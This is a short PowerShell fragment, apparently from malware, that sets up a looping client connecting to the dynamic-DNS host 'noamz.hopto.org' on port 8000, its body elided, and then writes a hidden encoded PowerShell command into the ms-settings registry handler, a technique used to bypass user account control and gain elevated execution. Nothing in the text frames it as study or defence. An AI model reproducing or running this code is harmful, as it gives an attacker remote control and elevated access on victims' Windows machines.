$clientz = { $address = 'noamz.hopto.org'
$port = 8000
while ($true) {
    do {
        try {
...
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w 1 -nop -noni -e $clientz" -Force
